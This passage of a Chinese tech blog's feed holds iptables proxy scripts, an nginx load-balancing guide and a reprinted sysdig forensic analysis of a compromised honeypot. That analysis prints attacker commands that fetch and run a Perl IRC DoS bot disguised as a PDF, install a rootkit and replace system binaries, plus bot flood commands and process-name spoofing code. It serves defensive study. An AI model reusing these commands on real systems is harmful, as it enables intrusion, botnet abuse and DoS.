<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">PROXY_IP=192.168.1.10</div><div class="line">PROXY_PORT=3128</div><div class="line">LAN_IP=`nvram get lan_ipaddr`</div><div class="line">LAN_NET=<span class="variable">$LAN_IP</span>/`nvram get lan_netmask`</div><div class="line"></div><div class="line">iptables -t nat -A PREROUTING -i br0 <span class="_">-s</span> <span class="variable">$LAN_NET</span> <span class="_">-d</span> <span class="variable">$LAN_NET</span> -p tcp --dport 80 -j ACCEPT</div><div class="line">iptables -t nat -A PREROUTING -i br0 <span class="_">-s</span> ! <span class="variable">$PROXY_IP</span> -p tcp --dport 80 -j DNAT --to <span class="variable">$PROXY_IP</span>:<span class="variable">$PROXY_PORT</span></div><div class="line">iptables -t nat -I POSTROUTING -o br0 <span class="_">-s</span> <span class="variable">$LAN_NET</span> <span class="_">-d</span> <span class="variable">$PROXY_IP</span> -p tcp -j SNAT --to <span class="variable">$LAN_IP</span></div><div class="line">iptables -I FORWARD -i br0 -o br0 <span class="_">-s</span> <span class="variable">$LAN_NET</span> <span class="_">-d</span> <span class="variable">$PROXY_IP</span> -p tcp --dport <span class="variable">$PROXY_PORT</span> -j ACCEPT</div></pre></td></tr></table></figure>
<p>This solution described in the previous section redirects packets to the proxy server using Network Address Translation to modify the actual packets. The result is that packets arriving at the proxy have a source IP address of the router rather than the original client. As a result, it’s not possible to see the IP address of the originating client in the proxy logs, nor is it possible to apply access rules in the proxy based on the originating client IP address.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">PROXY_IP=192.168.1.10</div><div class="line"></div><div class="line">iptables -t mangle -A PREROUTING -j ACCEPT -p tcp --dport 80 <span class="_">-s</span> <span class="variable">$PROXY_IP</span></div><div class="line">iptables -t mangle -A PREROUTING -j MARK --set-mark 3 -p tcp --dport 80 </div><div class="line">ip rule add fwmark 3 table 2 </div><div class="line">ip route add default via <span class="variable">$PROXY_IP</span> dev br0 table 2</div></pre></td></tr></table></figure>
<p>还需要改一下port，否则数据包还是转发到proxy机器的80端口上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 80 -j REDIRECT --to-port [PROXY_PORT]</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;redsocks2-shadowsocks&quot;&gt;&lt;a href=&quot;#redsocks2-shadowsocks&quot; class=&quot;headerlink&quot; title=&quot;redsocks2 + shadowsocks&quot;&gt;&lt;/a&gt;redsocks2 + shadowsoc
    
    </summary>
    
      <category term="Network" scheme="http://blog.pickbox.me/categories/Network/"/>
    
    
  </entry>
  
  <entry>
    <title>nginx负载均衡</title>
    <link href="http://blog.pickbox.me/2016/11/17/nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    <id>http://blog.pickbox.me/2016/11/17/nginx负载均衡/</id>
    <published>2016-11-17T07:13:30.000Z</published>
    <updated>2016-12-04T07:21:45.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Nginx负载均衡配置"><a href="#Nginx负载均衡配置" class="headerlink" title="Nginx负载均衡配置"></a>Nginx负载均衡配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">http &#123;</div><div class="line"></div><div class="line">    # ... 省略其它配置</div><div class="line"></div><div class="line">    upstream tomcats &#123;</div><div class="line">        server 192.168.0.100:8080;</div><div class="line">        server 192.168.0.101:8080;</div><div class="line">        server example.com:8080;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    server &#123;</div><div class="line">        listen 80;</div><div class="line"></div><div class="line">        location / &#123;</div><div class="line">            proxy_pass http://tomcats;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    # ... 省略其它配置</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>proxy_pass <a href="http://tomcats：表示将所有请求转发到tomcats服务器组中配置的某一台服务器上。" target="_blank" rel="external">http://tomcats：表示将所有请求转发到tomcats服务器组中配置的某一台服务器上。</a></p>
<ul>
<li>weight指定权重</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">upstream tomcats &#123;</div><div class="line">    server 192.168.0.100:8080 weight=2;  # 2/6次</div><div class="line">    server 192.168.0.101:8080 weight=3;  # 3/6次</div><div class="line">    server 192.168.0.102:8080 weight=1;  # 1/6次</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li><p>max_fails：默认为1。某台Server允许请求失败的次数，超过最大次数后，在fail_timeout时间内，新的请求将不会分配给这台机器。如果设置为0，Nginx会将这台Server置为永久无效状态，然后将请求发给定义了proxy_next_upstream, fastcgi_next_upstream, uwsgi_next_upstream, scgi_next_upstream, and memcached_next_upstream指令来处理这次错误的请求。</p>
</li>
<li><p>fail_timeout：默认为10秒。某台Server达到max_fails次失败请求后，在fail_timeout期间内，nginx会认为这台Server暂时不可用，不会将请求分配给它</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">upstream tomcats &#123;</div><div class="line">    server 192.168.0.100:8080 weight=2 max_fails=3 fail_timeout=15;</div><div class="line">    server 192.168.0.101:8080 weight=3;</div><div class="line">    server 192.168.0.102:8080 weight=1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>192.168.0.100这台机器，如果有3次请求失败，nginx在15秒内，不会将新的请求分配给它。</p>
<ul>
<li>backup：备份机，所有服务器挂了之后才会生效</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">upstream tomcats &#123;</div><div class="line">    server 192.168.0.100:8080 weight=2 max_fails=3 fail_timeout=15;</div><div class="line">    server 192.168.0.101:8080 weight=3;</div><div class="line">    server 192.168.0.102:8080 backup;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>down：标识某一台server不可用</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">upstream tomcats &#123;</div><div class="line">    server 192.168.0.100:8080 weight=2 max_fails=3 fail_timeout=15;</div><div class="line">    server 192.168.0.101:8080 down;</div><div class="line">    server 192.168.0.102:8080 backup;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>表示101这台Server为无效状态，不会将请求分配给它</p>
<h3 id="url-hash"><a href="#url-hash" class="headerlink" title="url_hash"></a>url_hash</h3><p>按请求url的hash结果来分配请求，使每个url定向到同一个后端服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">upstream tomcats &#123;</div><div class="line">    server 192.168.0.100:8080;</div><div class="line">    server 192.168.0.101:8080;</div><div class="line">    server 192.168.0.102:8080;</div><div class="line">    hash $request_uri;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="faire"><a href="#faire" class="headerlink" title="faire"></a>faire</h3><p>根据服务器的响应时间来分配请求，响应时间短的优先分配，即负载压力小的优先会分配</p>
<p>下载Nginx的upstream_fair模块进行安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">upstream tomcats &#123;</div><div class="line">    fair;</div><div class="line">    server 192.168.0.100:8080;</div><div class="line">    server 192.168.0.101:8080;</div><div class="line">    server 192.168.0.102:8080;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Nginx负载均衡配置&quot;&gt;&lt;a href=&quot;#Nginx负载均衡配置&quot; class=&quot;headerlink&quot; title=&quot;Nginx负载均衡配置&quot;&gt;&lt;/a&gt;Nginx负载均衡配置&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tabl
    
    </summary>
    
      <category term="Network" scheme="http://blog.pickbox.me/categories/Network/"/>
    
    
  </entry>
  
  <entry>
    <title>［转］搭建ngrok服务实现内网穿透</title>
    <link href="http://blog.pickbox.me/2016/04/18/%EF%BC%BB%E8%BD%AC%EF%BC%BD%E6%90%AD%E5%BB%BAngrok%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <id>http://blog.pickbox.me/2016/04/18/［转］搭建ngrok服务实现内网穿透/</id>
    <published>2016-04-18T11:30:21.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>转：<a href="https://imququ.com/post/self-hosted-ngrokd.html" target="_blank" rel="external">https://imququ.com/post/self-hosted-ngrokd.html</a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/搭建ngrok服务实现内网穿透.pdf" target="_blank" rel="external">搭建ngrok服务实现内网穿透</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转：&lt;a href=&quot;https://imququ.com/post/self-hosted-ngrokd.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://imququ.com/post/self-hosted-ngrokd.htm
    
    </summary>
    
      <category term="Network" scheme="http://blog.pickbox.me/categories/Network/"/>
    
    
  </entry>
  
  <entry>
    <title>［转］Fishing for Hackers: Analysis of a Linux Server Attack</title>
    <link href="http://blog.pickbox.me/2016/03/30/%EF%BC%BB%E8%BD%AC%EF%BC%BDFishing-for-Hackers-Analysis-of-a-Linux-Server-Attack/"/>
    <id>http://blog.pickbox.me/2016/03/30/［转］Fishing-for-Hackers-Analysis-of-a-Linux-Server-Attack/</id>
    <published>2016-03-30T08:23:54.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><article><section>原文：<a href="http://drops.wooyun.org/tips/14148" target="_blank" rel="external">http://drops.wooyun.org/tips/14148</a></section></article></p>
<p>&nbsp;</p>
<p>几天前我偶然看到一篇经典的<a href="http://plusbryan.com/my-first-5-minutes-on-a-server-or-essential-security-for-linux-servers" target="_blank" rel="external">博文</a>，文章介绍了加强一个全新Linux服务安全性的常规做法，其中包括安装fail2ban，禁用SSH密码认证，随机化SSH端口，配置iptables等内容。这让我联想到，假如我与其背道而驰会发生什么？当然，最常见的结果就是使其沦陷成为一个僵尸网络的受害者，僵尸网络就是在不停地扫描大范围的公网IP地址，以期望通过暴力破解（SSH或Wordpress等）的方式找到一些配置不当的服务。但是当你成为这些简单攻击的受害者时，实际上发生了什么？攻击者又做了些什么？本篇文章就使用<a href="http://www.sysdig.org/" target="_blank" rel="external">sysdig</a>捕获分析我们服务器上实际攻击的例子，进而解答以上提出的问题。所以让我们钓起鱼儿来！</p>
<h1>0x00 起步</h1>

<hr>

<p>具体的想法就是将一组配置不当且存在漏洞的服务器暴露在互联网上，等到有人入侵后，我们再来分析一下发生了哪些有趣的事情。这就相当于：把诱饵撒到水中，等待鱼儿上钩，然后抓一个上来研究研究。首先我需要一些诱饵，意即一些配置不当的主机。现在来说这些都是so easy的事儿啦。我使用了好几种IaaS供应商（确切来说是AWS，Rackspace和Digital Ocean）的服务，配置了大约20台Ubuntu 12.04服务器——希望其中至少有一个服务器能够成为某些僵尸网络的“重点”关注对象。接下来就需要正确地记录操作系统的活动，这样我就可以确切地知道攻击者采取了哪些手段。因为我喜爱使用sysdig，所以我选择将sysdig和S3组合使用。我使用<code>-z</code>来启用sysdig的压缩功能，进而捕获每个I/O buffer中产生的大量字节数。</p>
<div><br><div id="highlighter_273270"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div></td><br><td><br><div><br><div><code>sysdig -s 4096 -z -w </code><code>/mnt/sysdig/</code><code>$(</code><code>hostname</code><code>).scap.gz</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>现在所有的实例都已配置妥当，我就简单地以”password”作为密码开启SSH root登录，以确保即使是最愚蠢的暴力破解算法也能很快地攻破系统。在这之后，我就静静地看着sysdig将结果dump到S3上。<br><h1>0x01 中头彩了！</h1><br><br><hr><br><br>第一个鱼儿来得如此之快：其中一个服务器仅在4小时后就被攻陷了！我是怎么知道的？我注意到在我的S3 bucket上，sysdig记录的文件在顷刻间往上跳了好几兆——远远超过了闲置服务器在后台运行时，应该产生大约100KB/hour的流量。所以我就将这个记录文件（大约150MB）下载到我的OSX上，探索研究一下。<br><h1>0x02 探索服务器端产生的攻击</h1><br><br><hr><br><br>我以我比较喜欢的方式开始进行分析：总览一下主机上进程，网络和I/O当中发生了些什么。首先，我通过受害主机上的网络I/O流量来查看top进程：<br><div><br><div id="highlighter_318427"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -c topprocs_net</code></div><br><div><code>Bytes     Process</code></div><br><div><code>——————————</code></div><br><div><code>439.63M   </code><code>/usr/sbin/httpd</code></div><br><div><code>422.29M   </code><code>/usr/local/apac</code></div><br><div><code>5.27M     sshd</code></div><br><div><code>2.38M     wget</code></div><br><div><code>20.81KB   httpd</code></div><br><div><code>9.94KB    httpd</code></div><br><div><code>6.40KB    perl</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>服务器上产生了相当多的流量，但是我并没有配置任何服务！在那之后我也不记得有安装过<code>/usr/sbin/httpd</code>和<code>/usr/local/apac</code>。接下来我们再看看网络连接：<br><div><br><div id="highlighter_195185"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -c topconns</code></div><br><div><code>Bytes     Proto     Connection</code></div><br><div><code>——————————</code></div><br><div><code>439.58M   udp       170.170.35.93:50978-&gt;39.115.244.150:800</code></div><br><div><code>422.24M   udp       170.170.35.93:55169-&gt;39.115.244.150:800</code></div><br><div><code>4.91M     tcp       85.60.66.5:59893-&gt;170.170.35.93:22</code></div><br><div><code>46.72KB   tcp       170.170.35.93:39193-&gt;162.243.147.173:3132</code></div><br><div><code>43.62KB   tcp       170.170.35.93:39194-&gt;162.243.147.173:3132</code></div><br><div><code>20.81KB   tcp       170.170.35.93:53136-&gt;198.148.91.146:6667</code></div><br><div><code>1000B     udp       170.170.35.93:0-&gt;39.115.244.150:800</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>我的主机产生了800MB的UDP流量——我的天哪！这简直就是活生生的DOS攻击。我猜测攻击者安装了一些僵尸网络的客户端，来生成相应的DOS流量，所以我当机立断地把服务器关了，确保它不会对其他人造成进一步的伤害。就我目前所掌握的信息可以确定服务器已经被攻陷了，我如果使用其他的监控工具也可以得出相同的结论。然而不同的是，我的S3 bucket里存储着全部的细节，所以我就可以开始深度挖掘实际发生的情况。我先使用我最爱的chisel，<code>spy_users</code>，看看恶意用户在登录之后干了些啥：<br><div><br><div id="highlighter_95936"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -c spy_users</code></div><br><div><code>06:11:28 root) </code><code>cd</code> <code>/usr/sbin</code></div><br><div><code>06:11:30 root) </code><code>mkdir</code> <code>.shm</code></div><br><div><code>06:11:32 root) </code><code>cd</code> <code>/usr/sbin/</code><code>.shm</code></div><br><div><code>06:11:39 root) wget xxxxxxxxx.altervista.org</code><code>/l</code><code>.tgz</code></div><br><div><code>06:11:40 root) </code><code>tar</code> <code>zxvf l.tgz</code></div><br><div><code>06:11:42 root) </code><code>cd</code> <code>/usr/sbin/</code><code>.shm</code><code>/lib/</code><code>.muh</code><code>/src</code></div><br><div><code>06:11:43 root) </code><code>/bin/bash</code> <code>.</code><code>/configure</code> <code>–</code><code>enable</code><code>-</code><code>local</code></div><br><div><code>06:11:56 root) </code><code>make</code> <code>all</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>看到这里发生了什么吗？攻击者使用了一个“聪明”的名字<code>.shm</code>，在<code>/usr/sbin</code>目录下创建了一个隐藏文件夹，然后下载程序的源代码并开始编译。我把上面URL中的文件下载下来了，发现它是个IRC bouncer Muh。在存档文件中，我发现一些类似于攻击者非常个人化的配置文件这样有趣的事物，其中包含了各种用户名密码还有一堆用于自动加入Undernet的IRC channel。他接下来做了这些事：<br><div><br><div id="highlighter_707786"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div></td><br><td><br><div><br><div><code>06:13:19 root) wget http:</code><code>//xxxxxxxxx</code><code>.altervista.org/.sloboz.pdf</code></div><br><div><code>06:13:20 root) perl .sloboz.pdf</code></div><br><div><code>06:13:20 root) </code><code>rm</code> <code>-rf .sloboz.pdf</code></div><br><div><code>06:12:58 root) </code><code>/sbin/iptables</code> <code>-I INPUT -p tcp –dport 9000 -j ACCEPT</code></div><br><div><code>06:12:58 root) </code><code>/sbin/iptables</code> <code>-I OUTPUT -p tcp –dport 6667 -j ACCEPT</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>Nice！一个perl脚本文件被下载成为一个隐藏的pdf文件。我很好奇想要了解更多的东西。不幸的是，当我试图访问以上的URL时，文件已经不复存在了。好吧，还有sysdig可以帮助我，因为它记录了每一个I/O操作（正如我在命令中指定的，每个操作最多记录4096字节的数据）。我就可以看到wget往文件中写了些啥：<br><div><br><div id="highlighter_280507"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div><br><div>11</div><br><div>12</div><br><div>13</div><br><div>14</div><br><div>15</div><br><div>16</div><br><div>17</div><br><div>18</div><br><div>19</div><br><div>20</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -A -c echo_fds fd.filename=.sloboz.pdf</code></div><br><div><code>—— Write 3.89KB to </code><code>/run/shm/</code><code>.sloboz.pdf</code></div><br><div><code>#!/usr/bin/perl</code></div><br><div><code>####################################################################################################################</code></div><br><div><code>####################################################################################################################</code></div><br><div><code>##  Undernet Perl IrcBot v1.02012 bY DeBiL @RST Security Team   ## [ Help ] #########################################</code></div><br><div><code>##      Stealth MultiFunctional IrcBot Writen in Perl          #####################################################</code></div><br><div><code>##        Teste on every system with PERL instlled             ##  !u @system                                     ##</code></div><br><div><code>##                                                             ##  !u @version                                    ##</code></div><br><div><code>##     This is a free program used on your own risk.           ##  !u @channel                                    ##</code></div><br><div><code>##        Created for educational purpose only.                ##  !u @flood                                      ##</code></div><br><div><code>## I’m not responsible for the illegal use of this program.    ##  !u @utils                                      ##</code></div><br><div><code>####################################################################################################################</code></div><br><div><code>## [ Channel ] #################### [ Flood ] ################################## [ Utils ] #########################</code></div><br><div><code>####################################################################################################################</code></div><br><div><code>## !u !join &lt;#channel&gt;          ## !u @udp1 &lt;ip&gt; &lt;port&gt; &lt;time&gt;              ##  !su @conback &lt;ip&gt; &lt;port&gt;          ##</code></div><br><div><code>## !u !part &lt;#channel&gt;          ## !u @udp2 &lt;ip&gt; &lt;packet size&gt; &lt;time&gt;       ##  !u @downlod &lt;url+path&gt; &lt;file&gt;     ##</code></div><br><div><code>## !u !uejoin &lt;#channel&gt;        ## !u @udp3 &lt;ip&gt; &lt;port&gt; &lt;time&gt;              ##  !u @portscan &lt;ip&gt;                 ##</code></div><br><div><code>## !u !op &lt;channel&gt; &lt;nick&gt;      ## !u @tcp &lt;ip&gt; &lt;port&gt; &lt;packet size&gt; &lt;time&gt; ##  !u @mail &lt;subject&gt; &lt;sender&gt;       ##</code></div><br><div><code>## !u !deop &lt;channel&gt; &lt;nick&gt;    ## !u @http &lt;site&gt; &lt;time&gt;                   ##           &lt;recipient&gt; &lt;message&gt;    ##</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>因催斯汀…这原来是一个perl DoS客户端，可以被IRC控制执行命令，所以攻击者就可以很轻松地管理这些成千上万的机器。我也是足够地幸运，因为wget在整个过程中就进行了4KB的I/O操作，所以如果我查看全部的输出，我就可以得到完整的源代码（以上的是被截断的）。通过读取其中的header我们就可以知道这个东西是怎么运作的——它应该会接收到一个“<code>@udp</code>”IRC消息然后使用网络流量冲击目标主机。让我们来看看是否有人发送了一个命令：<br><div><br><div id="highlighter_651535"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -A -c echo_fds evt.buffer contains @udp</code></div><br><div><code>—— Read 67B from 170.170.35.93:39194-&gt;162.243.147.173:3132</code></div><br><div><code>:x!~xxxxxxxxx@xxxxxxxxx.la PRIVMSG </code><code>#nanana :!u @udp1 39.115.244.150 800 300</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>正如你所见，bot接收到一个（肯定来自它的owner）TCP连接，其中包含一条向39.115.244.150IP的800端口的攻击命令，这正好跟之前网络连接列表中，前两项泛洪数百兆流量的IP地址和端口号相同。这一切都很有意义！但是攻击并没有就此止步：<br><div><br><div id="highlighter_253838"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div></td><br><td><br><div><br><div><code>06:13:11 root) wget xxxxxxxxx.xp3.biz</code><code>/other/rk</code><code>.</code><code>tar</code></div><br><div><code>06:13:12 root) </code><code>tar</code> <code>xvf rk.</code><code>tar</code></div><br><div><code>06:13:12 root) </code><code>rm</code> <code>-rf rk.</code><code>tar</code></div><br><div><code>06:13:12 root) </code><code>cd</code> <code>/usr/sbin/rk</code></div><br><div><code>06:13:17 root) </code><code>tar</code> <code>zxf mafixlibs</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>什么是mafixlibs？Google说它是一种rootkit，但是我想看看在那个tar文件里包含着什么，所以我就再次使用sysdig，查询tar写了哪些文件：<br><div><br><div id="highlighter_733362"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div><br><div>11</div><br><div>12</div><br><div>13</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -c topfiles_bytes proc.name contains </code><code>tar</code> <code>and proc.args contains mafixlibs</code></div><br><div><code>Bytes     Filename</code></div><br><div><code>——————————</code></div><br><div><code>207.76KB  </code><code>/usr/sbin/rk/bin/</code><code>.sh</code><code>/sshd</code></div><br><div><code>91.29KB   </code><code>/usr/sbin/rk/bin/ttymon</code></div><br><div><code>80.69KB   </code><code>/usr/sbin/rk/bin/lsof</code></div><br><div><code>58.14KB   </code><code>/usr/sbin/rk/bin/find</code></div><br><div><code>38.77KB   </code><code>/usr/sbin/rk/bin/dir</code></div><br><div><code>38.77KB   </code><code>/usr/sbin/rk/bin/ls</code></div><br><div><code>33.05KB   </code><code>/usr/sbin/rk/bin/lib/libproc</code><code>.a</code></div><br><div><code>30.77KB   </code><code>/usr/sbin/rk/bin/ifconfig</code></div><br><div><code>30.71KB   </code><code>/usr/sbin/rk/bin/md5sum</code></div><br><div><code>25.88KB   </code><code>/usr/sbin/rk/bin/syslogd</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>可以很清楚地看到是一堆二进制文件。所以我猜测在我的<code>spy_users</code>输出中可以看到攻击者正在替换系统组件：<br><div><br><div id="highlighter_418315"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div></td><br><td><br><div><br><div><code>06:13:18 root) chattr -isa </code><code>/sbin/ifconfig</code></div><br><div><code>06:13:18 root) </code><code>cp</code> <code>/sbin/ifconfig</code> <code>/usr/lib/libsh/</code><code>.backup</code></div><br><div><code>06:13:18 root) </code><code>mv</code> <code>-f </code><code>ifconfig</code> <code>/sbin/ifconfig</code></div><br><div><code>06:13:18 root) chattr +isa </code><code>/sbin/ifconfig</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>确实，他人还挺好的给我留了一份备份文件。到目前为止我所掌握的信息有：我得到了一对IRC bots，一些入侵系统的二进制文件以及我成功解释了在开始时看到的UDP泛洪流量。但还遗留下来一个问题就是：为什么<code>topprocs_net</code>显示出所有的UDP流量都是由<code>/usr/sbin/httpd</code>和<code>/usr/local/apac</code>进程产生的，我还未在<code>spy_users</code>的输出中发现哪些安装在机器上的二进制文件呢？我猜测perl bot它自己能够发送UDP数据包，因为它是接收命令的那一方。让我们再次使用<code>sysdig</code>，并且定位到系统调用级别。我想查看所有和“<code>/usr/local/apac</code>”有关的事件：<br><div><br><div id="highlighter_230877"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -A evt.args contains </code><code>/usr/local/apac</code></div><br><div><code>…</code></div><br><div><code>955716 06:13:20.225363385 0 perl (10200) &lt; clone res=10202(perl) exe=</code><code>/usr/local/apach</code> <code>args= tid=10200(perl) pid=10200(perl) ptid=7748(-</code><code>bash</code><code>) cwd=</code><code>/tmp</code> <code>fdlimit=1024 flags=0 uid=0 gid=0 exepath=</code><code>/usr/bin/perl</code></div><br><div><code>…</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>既然来到这儿了，我也想看看这个pid为10200的perl进程是何时启动的：<br><div><br><div id="highlighter_619673"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz proc.pid = 10200</code></div><br><div><code>954458 06:13:20.111764417 0 perl (10200) &lt; execve res=0 exe=perl args=.sloboz.pdf. tid=10200(perl) pid=10200(perl) ptid=7748(-</code><code>bash</code><code>) cwd=</code><code>/run/shm</code> <code>fdlimit=1024 exepath=</code><code>/usr/bin/perl</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>同我们之前看到的那样，perl进程只是和“<code>.sloboz.pdf</code>”相关。但是你有没有看出其中的端倪？这极有可能被鱼目混珠过去：perl进程（肯定是DoS客户端）将它自己fork了（clone event 955716），但是在这之前它把它自己的可执行文件名和参数（“exe” and “args”）从“perl .sloboz.pdf” （event 954458）改为一个随机且不可疑的“/usr/local/apach” (event 955716)。这就可以迷惑像ps，top和sysdig这样的工具。当然，在这里是并没有<code>/usr/local/apach</code>的。你可以看到在fork进程后从未执行过一个新的二进制文件，它只是改变了名字而已。通过阅读perl客户端的源码（使用<code>echo_fds</code>），我可以进一步确认这一点：<br><div><br><div id="highlighter_522921"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div></td><br><td><br><div><br><div><code>my @rps = (</code><code>“/usr/local/apache/bin/httpd -DSSL”</code><code>,</code><code>“/usr/sbin/httpd -k start -DSSL”</code><code>,</code><code>“/usr/sbin/httpd”</code><code>,</code><code>“/usr/sbin/sshd -i”</code><code>,</code><code>“/usr/sbin/sshd”</code><code>,</code><code>“/usr/sbin/sshd -D”</code><code>,</code><code>“/sbin/syslogd”</code><code>,</code><code>“/sbin/klogd -c 1 -x -x”</code><code>,</code><code>“/usr/sbin/acpid”</code><code>,</code><code>“/usr/sbin/cron”</code><code>);    </code></div><br><div></div><br><div><code>my $process = $rps[rand scalar @rps];    </code></div><br><div></div><br><div><code>$0=</code><code>“$process”</code><code>.</code><code>“”</code><code>x16;;    </code></div><br><div></div><br><div><code>my 